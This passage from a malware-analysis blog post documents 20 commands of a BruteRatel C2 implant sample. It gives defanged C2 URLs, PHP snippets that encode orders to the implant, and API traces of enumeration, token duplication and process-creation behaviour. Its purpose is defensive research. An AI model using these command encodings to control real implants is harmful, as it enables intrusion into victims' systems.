---
title: "BruteRatel full command analysis (4/X)"
date: 2025-03-28 
---

<link rel="stylesheet" href="/css/main.css">

## BRUTERATEL COMMAND LIST PART 4 

## Context  

BruteRatel SHA256 : d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1  

Sample Source :  
[bazaar.abuse.ch](https://bazaar.abuse.ch/sample/d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1/)   

VirusTotal :  
[VirusTotal](https://www.virustotal.com/gui/file/d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1)  

Network / C2 :  
http://tiguanin[.]com/bazar.php:8041  
http://tiguanin[.]com/admin.php:8041  
http://bazarunet[.]com/admin.php:8041  
http://bazarunet[.]com/bazar.php:8041  
http://greshunka[.]com/bazar.php:8041  
http://greshunka[.]com/admin.php:8041  

# INTRO  

This article is the 4th part of my full analysis of BruteRatel commands : [Previous Part](https://cedricg-mirror.github.io/2025/03/20/BruteRatel3.html)  

This detailed analysis will be split into several parts, I will be presenting in this post the next 20 commands that BruteRatel can respond to.  

# COMMAND LIST

Here is a short description of the next 20 command codes and purpose :  

| Command ID   | Description             | Parameter         |
| :----------- | :---------------------- | :----------------:|
| "\x81\x98"  | [ASN1_unknown](#ASN1_unknown) | $p1 $p2 |
| "\x53\x49"   | [netshareenum](#netshareenum) | $servername, $level |
| "\x13\x52"  | [ExecWQLQuery](#ExecWQLQuery) | $query |
| "\xe7\x81"   | [GetAccountSidFromPid](#GetAccountSidFromPid) | $pid |
| "\x56\xf8   | [unknown](#unknown) | $p1 |
| "\x46\xcb"   | [unknown2](#unknown2) | $p1 |
| "\x32\x49"   | [unknown3](#unknown3) | NA |
| "\x92\x64"   | [EnumProcessModules](#EnumProcessModules) | $pid |
| "\x48\x73"   | [CreateProcessSuspended](#CreateProcessSuspended) | $processPath |
| "\x44\x80"   | [LoadManagedCode](#LoadManagedCode) | $binary |
| "\x56\x34   | [StartService](#StartService) | $MachineName, $ServiceName |
| "\x8E\xB9   | [NetSessionEnum](#NetSessionEnum) | $ServerName |
| "\x79\x75"   | [AD_Object_unknown](#AD_Object_unknown) | $p1, $p2, $p3 |
| "\x9a\xb9"   | [NetUserModalsGet](#NetUserModalsGet) | $ServerName |
| "\x9a\xb6"   | [GetScheduledTask](#GetScheduledTask) | $serverName |
| "\xb3\x29"   | [netshareenumlist](#netshareenumlist) | $servername |
| "\xa9\xe4"   | [InjectProcessShellcode](#InjectProcessShellcode) | $pid |
| "\xf3\xd8"   | [WtsEnumProcessA](#WtsEnumProcessA) | $RDServerName |
| "\xbf\xb"   | [UpdateConfig](#UpdateConfig) | $config |
| "\xa9\xb3"   | [count_exec_cmd](#count_exec_cmd) | $count, $sleep, $cmd |

In the following section, I share some dynamic analysis results from the aforementioned commands :  

<a id="ASN1_unknown"></a>
# ASN1_unknown

This function would require some reverse-engineering to maybe enable a runtime execution.  
It requires two parameters of fixed size that are used to create an ASN.1 Decoder and Encoder and 14 unknown parameters    
Without a domain controler, I cannot run past the LsaQueryInformationPolicy call in dynamic analysis

```php
/*
	$p1 : sizeof = 0x6DD
	$p2 : sizeof = 0x355
*/
function ASN1_unknown($p1, $p2)
{
	$p1 = "";
	for ($i = 0; $i < 0x6dd; $i++)
		$p1 = $p1 . "A";
		
	$p2 = "";
	for ($i = 0; $i < 0x355; $i++)
		$p2 = $p2 . "B";
	
	$p1_b64 = base64_encode($p1);
	$p2_b64 = base64_encode($p2);
	
	$cmd_id = "\x81\x98 $p1_b64 $p2_b64 AA BB CC DD EE FF GG HH II JJ KK LL MM NN";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```
**II. Execution**   

```html
[CNT] [394]
[PTP] [0xbc8] [0x7c0] [c:\windows\system32\rundll32.exe]
[API] <ASN1_CreateModule> in [MSASN1.dll] 
[INF] [ Undocumented ]
[PAR] ASN1uint32_t       nVersion       : 0x10000
[PAR] ASN1encodingrule_e eRule          : 0x400
[PAR] ASN1uint32_t       dwFlags        : 0x1000
[PAR] ASN1uint32_t       cPDU           : 0x1
[PAR] ASN1GenericFun_t   apfnEncoder    : 0x000000CFB02390A0
[PAR] ASN1GenericFun_t   apfnDecoder    : 0x000000CFB02390A0
[PAR] ASN1FreeFun_t      apfnFreeMemory : 0x000000CFB02390A0
[PAR] ASN1uint32_t*      acbStructSize  : 0x000000CFB0239760
[PAR] ASN1magic_t        nModuleName    : 0x0
[RET] [0xcfb020b54c]

[CNT] [395]
[PTP] [0xbc8] [0x7c0] [c:\windows\system32\rundll32.exe]
[API] <ASN1_CreateEncoder> in [MSASN1.dll] 
[INF] [ Undocumented ]
[PAR] ASN1module_t    pModule       : 0x000000CFAE35DAB0
[PAR] ASN1encoding_t* ppEncoderInfo : 0x000000CFB0236240
[PAR] ASN1octet_t*    pbBuff        : 0x0
[PAR] ASN1uint32_t    cbBuffSize    : 0x0
[PAR] ASN1encoding_t  pParent       : 0x0
[RET] [0xcfb020b57b]

[CNT] [396]
[PTP] [0xbc8] [0x7c0] [c:\windows\system32\rundll32.exe]
[API] <ASN1_CreateDecoder> in [MSASN1.dll] 
[INF] [ Undocumented ]
[PAR] ASN1module_t    pModule       : 0x000000CFAE35DAB0
[PAR] ASN1decoding_t* ppDecoderInfo : 0x000000CFB0236230
[PAR] ASN1octet_t*    pbBuff        : 0x0
[PAR] ASN1uint32_t    cbBuffSize    : 0x0
[PAR] ASN1decoding_t  pParent       : 0x0
[RET] [0xcfb020b5bc]

[CNT] [403]
[PTP] [0xbc8] [0x7c0] [c:\windows\system32\rundll32.exe]
[API] <LsaOpenPolicy> in [ADVAPI32.dll] 
[PAR] PLSA_UNICODE_STRING    SystemName       : 0x0
[PAR] PLSA_OBJECT_ATTRIBUTES ObjectAttributes : 0x000000CFB082EAE0
[PAR] ACCESS_MASK            DesiredAccess    : 0x1
[PAR] PLSA_HANDLE            PolicyHandle     : 0x000000CFB082EAD8
[RET] [0xcfb020d2e2]

[CNT] [404]
[PTP] [0xbc8] [0x7c0] [c:\windows\system32\rundll32.exe]
[API] <LsaQueryInformationPolicy> in [ADVAPI32.dll] 
[PAR] LSA_HANDLE               PolicyHandle     : 0x000000CFAE35DB30
[PAR] POLICY_INFORMATION_CLASS InformationClass : 0xc (PolicyDnsDomainInformation)
[PAR] PVOID*                   Buffer           : 0x000000CFB082EBE0
[RET] [0xcfb020d2f9]

[CNT] [405]
[PTP] [0xbc8] [0x7c0] [c:\windows\system32\rundll32.exe]
[API] <LsaClose> in [ADVAPI32.dll] 
[RET] [0xcfb020d30d]
```

<a id="netshareenum"></a>
# netshareenum  

```php
/*
	$level == 0 -> 501
	$level != 0 -> 502
*/
// ex: netshareenum("home", 1);
function netshareenum($servername, $level)
{
	$cmd_id = "\x53\x49 $servername $level";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [395]
[PTP] [0x798] [0x42c] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x00000086686A68A0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+Qbv+SP8fZwzhxBezUi1u9VBz"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x00000086686C4260
[PAR] DWORD   *pcbBinary : 0x000000866A5CE57C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x866a52bea1]
```

**II. Execution**   

```html
[CNT] [465]
[PTP] [0x798] [0xa1c] [c:\windows\system32\rundll32.exe]
[API] <NetShareEnum> in [srvcli.dll] 
[PAR] LMSTR   servername    : 0x00000086686AF3C0
[STR]         -> "home"
[PAR] DWORD   level         : 502
[PAR] LPBYTE* bufptr        : 0x000000866AB4F3A8
[PAR] DWORD   prefmaxlen    : 0xffffffff
[PAR] LPDWORD entriesread   : 0x00000086686AF3C0
[PAR] LPDWORD totalentries  : 0x00000086686AF3C0
[PAR] LPDWORD resume_handle : 0x00000086686AF3C0
[RET] [0x866a52ef14]
```

**III. Result**   

```html
[CNT] [470]
[PTP] [0x798] [0xa1c] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x00000086686C4EB0
[STR]        -> "5349"
[STR]           "home"
[STR]           "AA"
[STR]           "ADMIN$|Administration à distance|C:\Windows"
[STR]           "C$|Partage par défaut|C:\"
[STR]           "IPC$|IPC distant|"
[PAR] DWORD  cbBinary   : 0xca
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x000000866868F4F0
[PAR] DWORD* pcchString : 0x000000866AB4F28C
[RET] [0x866a52e028]
```

<a id="ExecWQLQuery"></a>
# ExecWQLQuery  

```php
// ex: ExecWQLQuery("SELECT * FROM Win32_OperatingSystem");
function ExecWQLQuery($query)
{
	$cmd_id = "\x13\x52 $query";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [327]
[PTP] [0x8f8] [0xa44] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000008556576190
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+UbrcSMtoCDXpwhieN05A5WEifA8/st/8JLmKKT4lWKO7Yj7ctJlQa7SbfuGuE7mAL7J6tMvLc9I2FQ=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000855658A620
[PAR] DWORD   *pcbBinary : 0x00000085585BE76C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x855851bea1]
```

**II. Execution**   

```html
[CNT] [351]
[PTP] [0x8f8] [0xa44] [c:\windows\system32\rundll32.exe]
[API] <CoInitializeEx> in [combase.dll] 
[RET] [0x8558533142]

[CNT] [352]
[PTP] [0x8f8] [0xa44] [c:\windows\system32\rundll32.exe]
[API] <CoInitializeSecurity> in [combase.dll] 
[RET] [0x855853317d]

[CNT] [353]
[PTP] [0x8f8] [0xa44] [c:\windows\system32\rundll32.exe]
[API] <CoCreateInstance> in [combase.dll] 
[PAR] REFCLSID  *clsid       : 0x0000008558537B90 ({4590F811-1D3A-11D0-891F-00AA004B2E24})
[PAR] LPUNKNOWN pUnkOuter    : 0x0
[PAR] DWORD     dwClsContext : 0x1
[PAR] REFIID    riid         : 0x0000008558537C90 (IWbemLocator)
[PAR] LPVOID    *ppv         : 0x00000085585BE600
[RET] [0x85585331aa]

[CNT] [354]
[PTP] [0x8f8] [0xa44] [c:\windows\system32\rundll32.exe]
[API] <IWbemLocator::ConnectServer> in [wbemprox.dll] 
[PAR] BSTR            strNetworkResource : 0x000000855657ED20
[STR]                 -> "ROOT\CIMV2"
[PAR] BSTR            strUser            : 0x0 (null)
[PAR] BSTR            strPassword        : 0x0 (null)
[PAR] BSTR            strLocale          : 0x0 (null)
[PAR] long            lSecurityFlags     : 0x0
[PAR] BSTR            strAuthority       : 0x0 (null)
[PAR] IWbemContext*   pCtx	             : 0x0
[PAR] IWbemServices** ppNamespace        : 0x00000085585BE608
[RET] [0x8558533208]

[CNT] [355]
[PTP] [0x8f8] [0xa44] [c:\windows\system32\rundll32.exe]
[API] <CoSetProxyBlanket> in [combase.dll] 
[PAR] IUnknown*                pProxy           : 0x000000855657ACD0
[PAR] DWORD                    dwAuthnSvc       : 0xffffffff
[PAR] DWORD                    dwAuthzSvc       : 0xffffffff
[PAR] OLECHAR*                 pServerPrincName : 0x0 (null)
[PAR] DWORD                    dwAuthnLevel     : 0x3
[PAR] DWORD                    dwImpLevel       : 0x3
[PAR] RPC_AUTH_IDENTITY_HANDLE pAuthInfo        : 0x0
[PAR] DWORD                    dwCapabilities   : 0x0
[RET] [0x85585332e4]

[CNT] [356]
[PTP] [0x8f8] [0xa44] [c:\windows\system32\rundll32.exe]
[API] <IWbemServices::ExecQuery> in [fastprox.dll] 
[PAR] BSTR                   strQueryLanguage : 0x0000008558538056
[STR]                        -> "WQL"
[PAR] BSTR                   strQuery         : 0x0000008556572BD0
[STR]                        -> "SELECT * FROM Win32_OperatingSystem"
[PAR] long                   lFlags           : 0x30 (WBEM_FLAG_RETURN_IMMEDIATELY | WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_ERROR_OBJECT | WBEM_FLAG_DONT_SEND_STATUS | WBEM_FLAG_SEND_ONLY_SELECTED)
[PAR] IWbemContext*          pCtx             : 0x0
[PAR] IEnumWbemClassObject** ppEnum           : 0x00000085585BE610
[RET] [0x8558533328]
```

**III. Result**   

```html
[CNT] [723]
[PTP] [0x8f8] [0xa44] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x00000085565B9510
[STR]        -> "1352"
[STR]           "ROOT\CIMV2"
[STR]           "BootDevice|\Device\HarddiskVolume1"
[STR]           "BuildNumber|9600"
[STR]           "BuildType|Multiprocessor Free"
[STR]           "Caption|Microsoft Windows 8.1 Professionnel"
[STR]           "CodeSet|1252"
[STR]           "CountryCode|33"
[STR]           "CreationClassName|Win32_OperatingSystem"
[STR]           "CSCreationClassName|Win32_ComputerSystem"
[STR]           "CSName|HOME"
[STR]           "CurrentTimeZone|60"
[STR]           "DataExecutionPrevention_32BitApplications|0"
[STR]           "DataExecutionPrevention_Available|0"
[STR]           "DataExecutionPrevention_Drivers|0"
[STR]           "DataExecutionPrevention_SupportPolicy|2"
[STR]           "Debug|0"
[STR]           "Description|"
[STR]           "Distributed|0"
[STR]           "EncryptionLevel|256"
[STR]           "ForegroundApplicationBoost|2"
[STR]           "FreePhysicalMemory|3459280"
[STR]           "FreeSpaceInPagingFiles|4194304"
[STR]           "FreeVirtualMemory|7713384"
[STR]           "InstallDate|20241022004215.000000+120"
[STR]           "LastBootUpTime|20250322183343.488256+060"
[STR]           "LocalDateTime|20250322183551.526000+060"
[STR]           "Locale|040c"
[STR]           "Manufacturer|Microsoft Corporation"
[STR]           "MaxNumberOfProcesses|4294967295"
[STR]           "MaxProcessMemorySize|137438953344"
[STR]           "MUILanguages|fr-FR"
[STR]           [TRUNCATED]
[PAR] DWORD  cbBinary   : 0xb9e
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x00000085565B74F0
[PAR] DWORD* pcchString : 0x00000085585BE49C
[RET] [0x855851e028]
```

<a id="GetAccountSidFromPid"></a>
# GetAccountSidFromPid  

```php
// ex: GetAccountSidFromPid(1952)
function GetAccountSidFromPid($pid)
{
	$cmd_id = "\xe7\x81 $pid";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [327]
[PTP] [0x5ac] [0x64c] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000791AC09A80
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+Ib/QSNMMNUn28Gv2Ui1u9VBz"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000791AC1A440
[PAR] DWORD   *pcbBinary : 0x000000791CABE7DC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x791ca1bea1]
```

**II. Execution**   

```html
[CNT] [335]
[PTP] [0x5ac] [0x64c] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtOpenProcess> in [ntdll.dll] 
[PAR] PHANDLE             ProcessHandle    : 0x000000791CABE298
[PAR] ACCESS_MASK         DesiredAccess    : 0x400 (PROCESS_QUERY_INFORMATION)
[PAR] POBJECT_ATTRIBUTES  ObjectAttributes : 0x000000791CABE2C0
[PAR] PCLIENT_ID          ClientId         : 0x000000791CABE2B0
[RET] [0x791ca34aab]

[CNT] [336]
[PTP] [0x5ac] [0x64c] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtOpenProcessToken> in [ntdll.dll] 
[PAR] HANDLE      ProcessHandle : 0x2f0
[PAR] ACCESS_MASK DesiredAccess : 0xa (TOKEN_DUPLICATE | TOKEN_QUERY)
[PAR] PHANDLE     TokenHandle   : 0x000000791CABE2A0
[RET] [0x791ca34b2f]

[CNT] [337]
[PTP] [0x5ac] [0x64c] [c:\windows\system32\rundll32.exe]
[API] <DuplicateTokenEx> in [ADVAPI32.dll] 
[RET] [0x791ca2058c]

[CNT] [338]
[PTP] [0x5ac] [0x64c] [c:\windows\system32\rundll32.exe]
[API] <GetTokenInformation> in [ADVAPI32.dll] 
[PAR] HANDLE                  TokenHandle            : 0x2f4
[PAR] TOKEN_INFORMATION_CLASS TokenInformationClass  : 0x1(TokenUser)
[PAR] LPVOID                  TokenInformation       : 0x0
[PAR] DWORD                   TokenInformationLength : 0x0
[PAR] PDWORD                  ReturnLength           : 0x000000791CABE284
[RET] [0x791ca20611]

[CNT] [339]
[PTP] [0x5ac] [0x64c] [c:\windows\system32\rundll32.exe]
[API] <GetTokenInformation> in [ADVAPI32.dll] 
[PAR] HANDLE                  TokenHandle            : 0x2f4
[PAR] TOKEN_INFORMATION_CLASS TokenInformationClass  : 0x1(TokenUser)
[PAR] LPVOID                  TokenInformation       : 0x000000791AC0A0C0
[PAR] DWORD                   TokenInformationLength : 0x2c
[PAR] PDWORD                  ReturnLength           : 0x000000791CABE284
[RET] [0x791ca20648]

[CNT] [340]
[PTP] [0x5ac] [0x64c] [c:\windows\system32\rundll32.exe]
[API] <LookupAccountSidW> in [ADVAPI32.dll] 
[PAR] LPCWSTR       lpSystemName            : 0x0 (null)
[PAR] PSID          lpSid                   : 0x000000791AC0A0D0
[PAR] LPTSTR        lpName                  : 0x000000791CABE2F0
[PAR] LPDWORD       cchName                 : 0x000000791CABE288
[PAR] LPTSTR        lpReferencedDomainName  : 0x000000791CABE4F8
[PAR] LPDWORD       cchReferencedDomainName : 0x000000791CABE288
[PAR] PSID_NAME_USE peUse                   : 0x000000791CABE28C
[RET] [0x791ca20678]

```

**III. Result**   

```html
[CNT] [348]
[PTP] [0x5ac] [0x64c] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x000000791AC1A0B0
[STR]        -> "E781"
[STR]           "home\user"
[PAR] DWORD  cbBinary   : 0x1c
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x000000791AC1CB90
[PAR] DWORD* pcchString : 0x000000791CABE1BC
[RET] [0x791ca1e028]
```

<a id="unknown"></a>
# unknown  

No direct interaction with the infected Host  
Some internal operation with the malware's configuration, related to the HTTP access Token.
I'll update later on after some more static analysis.  


<a id="unknown2"></a>
# unknown2  

No direct interaction with the infected Host  
Samme, this command free some memory allocated within the malware's global structure, todo..  

<a id="unknown3"></a>
# unknown3  

todo

<a id="EnumProcessModules"></a>
# EnumProcessModules  

```php
// ex: EnumProcessModules(3048);
function EnumProcessModules($pid)
{
	$cmd_id = "\x92\x64 $pid";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [327]
[PTP] [0x76c] [0x864] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000004EA881B250
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+f+bESNMiH0j01mv2Ui1u9VBz"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000004EA8828B40
[PAR] DWORD   *pcbBinary : 0x0000004EAA81E5EC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x4eaa77bea1]
```

**II. Execution**   

```html
[CNT] [340]
[PTP] [0x76c] [0x864] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtOpenProcess> in [ntdll.dll] 
[PAR] PHANDLE             ProcessHandle    : 0x0000004EAA81C0D8
[PAR] ACCESS_MASK         DesiredAccess    : 0x410 (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)
[PAR] POBJECT_ATTRIBUTES  ObjectAttributes : 0x0000004EAA81C500
[PAR] PCLIENT_ID          ClientId         : 0x0000004EAA81C2F8
[RET] [0x4eaa794aab]

[CNT] [341]
[PTP] [0x76c] [0x864] [c:\windows\system32\rundll32.exe]
[API] <GetProcessImageFileNameW> in [PSAPI.DLL] 
[PAR] HANDLE hProcess        : 0x2f8
[PAR] LPWSTR lpImageFileName : 0x0000004EAA81C0F0
[PAR] DWORD  nSize           : 0x104
[RET] [0x4eaa782a2b]

[CNT] [342]
[PTP] [0x76c] [0x864] [c:\windows\system32\rundll32.exe]
[API] <EnumProcessModules> in [PSAPI.DLL] 
[PAR] HANDLE   hProcess   : 0x2f8 
[PAR] HMODULE  *lphModule : 0x0000004EAA81C500
[PAR] DWORD    cb         : 0x2000
[PAR] LPDWORD  lpcbNeeded : 0x0000004EAA81C0D4
[RET] [0x4eaa782a60]

[CNT] [370]
[PTP] [0x76c] [0x864] [c:\windows\system32\rundll32.exe]
[API] <GetModuleFileNameExW> in [PSAPI.DLL] 
[PAR] HANDLE  hProcess   : 0x2f8 
[PAR] HMODULE hModule    : 0x00007FFFAFD00000 (ntdll.dll)
[PAR] LPWSTR  lpFilename : 0x0000004EAA81C2F8
[PAR] DWORD   nSize      : 0x104
[RET] [0x4eaa782b07]

[CNT] [371]
[PTP] [0x76c] [0x864] [c:\windows\system32\rundll32.exe]
[API] <GetFileVersionInfoSizeW> in [version.dll] 
[PAR] LPCWSTR lptstrFilename : 0x0000004EAA81C2F8
[STR]         -> "C:\Windows\SYSTEM32\ntdll.dll"
[PAR] LPDWORD lpdwHandle     : 0x0000004EAA81C014
[RET] [0x4eaa77e782]

[...]
```

**III. Result**   

```html
[CNT] [832]
[PTP] [0x76c] [0x864] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x0000004EA883B020
[STR]        -> "9264"
[STR]           "25"
[STR]           "\Device\HarddiskVolume2\Users\user\Desktop\Graphical Loader.exe"
[STR]           "0x00007FFFAFD00000|C:\Windows\SYSTEM32\ntdll.dll|Microsoft Corporation|DLL Couche NT"
[STR]           "0x00007FFFAE220000|C:\Windows\system32\KERNEL32.DLL|Microsoft Corporation|DLL du client API BASE Windows NT"
[STR]           "0x00007FFFAD260000|C:\Windows\system32\KERNELBASE.dll|Microsoft Corporation|DLL du client API BASE Windows NT"
[STR]           "0x00007FFFAB9F0000|C:\Windows\system32\apphelp.dll|Microsoft Corporation|Fichier DLL du client de compatibilité des appl"
[STR]           "ications"
[STR]           "0x00007FFFAD3C0000|C:\Windows\system32\USER32.dll|Microsoft Corporation|DLL client de l’API uilisateur de Windows multi-"
[STR]           "utilisateurs"
[STR]           "0x00007FFFAD550000|C:\Windows\system32\GDI32.dll|Microsoft Corporation|GDI Client DLL"
[STR]           "0x00007FFFAE3C0000|C:\Windows\system32\COMDLG32.dll|Microsoft Corporation|DLL commune de boîtes de dialogues"
[STR]           "0x00007FFFAD6B0000|C:\Windows\system32\ADVAPI32.dll|Microsoft Corporation|API avancées Windows 32"
[STR]           "0x00007FFFAE680000|C:\Windows\system32\SHELL32.dll|Microsoft Corporation|DLL commune du shell Windows"
[STR]           "0x00007FFFAE5D0000|C:\Windows\system32\msvcrt.dll|Microsoft Corporation|Windows NT CRT DLL"
[STR]           "0x00007FFFAE360000|C:\Windows\system32\SHLWAPI.dll|Microsoft Corporation|Bibliothèque d’utilitaires légers du Shell"
[STR]           "0x00007FFFAAA80000|C:\Windows\WinSxS\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.9600.17415_none_624048"
[STR]           "6fecbd8abb\COMCTL32.dll|Microsoft Corporation|Bibliothèque de contrôles de l’expérience utilisateur"
[STR]           "0x00007FFFAFC20000|C:\Windows\SYSTEM32\sechost.dll|Microsoft Corporation|Host for SCM/SDDL/LSA Lookup APIs"
[STR]           "0x00007FFFAE480000|C:\Windows\system32\RPCRT4.dll|Microsoft Corporation|Runtime d’appel de procédure distante"
[STR]           [TRUNCATED]
[PAR] DWORD  cbBinary   : 0x152e
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x0000004EA8837100
[PAR] DWORD* pcchString : 0x0000004EAA81C01C
[RET] [0x4eaa77e028]
```

<a id="CreateProcessSuspended"></a>
# CreateProcessSuspended  

```php
// ex: CreateProcessSuspended("notepad")
function CreateProcessSuspended($processPath)
{
	$cmd_id = "\x48\x73 $processPath";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [361]
[PTP] [0x95c] [0x410] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x00000017A8DC3EC0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+R8PYSPw1Z0jhzxSjJEwSvx9udygI3A=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x00000017A8DCD760
[PAR] DWORD   *pcbBinary : 0x00000017AAD8EB2C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x17aacbbea1]
```

**II. Execution**   

```html
[CNT] [384]
[PTP] [0x95c] [0x1e0] [c:\windows\system32\rundll32.exe]
[API] <CreatePipe> in [KERNEL32.DLL] 
[PAR] PHANDLE               hReadPipe        : 0x00000017AB2FE2B8
[PAR] PHANDLE               hWritePipe       : 0x00000017AB2FE2C0
[PAR] LPSECURITY_ATTRIBUTES lpPipeAttributes : 0x00000017AB2FE2F8
[PAR] DWORD                 nSize            : 0x0
[RET] [0x17aaccb70d]

[ * ] [pid 0x95c][tid 0x1e0] c:\windows\system32\rundll32.exe
[API] <CreatePipe>
[PAR] HANDLE  hReadPipe  : 0x2fc
[PAR] HANDLE  hWritePipe : 0x30c
[RES] BOOL 0x1

[CNT] [385]
[PTP] [0x95c] [0x1e0] [c:\windows\system32\rundll32.exe]
[API] <SetHandleInformation> in [KERNEL32.DLL] 
[PAR] HANDLE hObject : 0x2fc
[PAR] DWORD dwMask   : 0x1
[PAR] DWORD dwFlags  : 0x0
[RET] [0x17aaccb72b]

[CNT] [394]
[PTP] [0x95c] [0x1e0] [c:\windows\system32\rundll32.exe]
[API] <CreateProcessA> in [KERNEL32.DLL] 
[PAR] LPCTSTR               lpApplicationName    : 0x0 (null)
[PAR] LPCTSTR               lpCommandLine        : 0x00000017A8DAC1E0
[STR]                       -> "notepad"
[PAR] LPSECURITY_ATTRIBUTES lpProcessAttributes  : 0x0
[PAR] LPSECURITY_ATTRIBUTES lpThreadAttributes   : 0x0
[PAR] BOOL                  bInheritHandles      : 0x1
[PAR] DWORD                 dwCreationFlags      : 0x8000004 (CREATE_NO_WINDOW | CREATE_SUSPENDED)
[PAR] LPVOID                lpEnvironment        : 0x0
[PAR] LPCSTR                lpCurrentDirectory   : 0x0 (null)
[PAR] LPSTARTUPINFOA        lpStartupInfo        : 0x00000017AB2FE310
[FLD]                       -> lpDesktop   = 0x0 (null)
[FLD]                       -> lpTitle     = 0x0 (null)
[FLD]                       -> dwFlags     = 0x100 (STARTF_USESTDHANDLES)
[FLD]                       -> wShowWindow = 0x0
[FLD]                       -> hStdInput   = 0x0
[FLD]                       -> hStdOutput  = 0x30c
[FLD]                       -> hStdError   = 0x30c
[PAR] LPPROCESS_INFORMATION lpProcessInformation : 0x00000017AB2FE2E0
[RET] [0x17aaccb8ee]
```

**III. Result**   

```html
[CNT] [410]
[PTP] [0x95c] [0x1e0] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x00000017A8DCD2A0
[STR]        -> "B0E9"
[STR]           "AB 2968 1272 notepad"
[PAR] DWORD  cbBinary   : 0x32
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x00000017A8DE3810
[PAR] DWORD* pcchString : 0x00000017AB2FE17C
[RET] [0x17aacbe028]
```

<a id="LoadManagedCode"></a>
# LoadManagedCode  

```php
// ex: 
function LoadManagedCode($filename)
{
	$file = file_get_contents($filename);
	
	$p1_b64 = base64_encode($file);
	
	$cmd_id = "\x44\x80 $p1_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html
[CNT] [459]
[PTP] [0x478] [0x9a0] [c:\windows\system32\rundll32.exe]
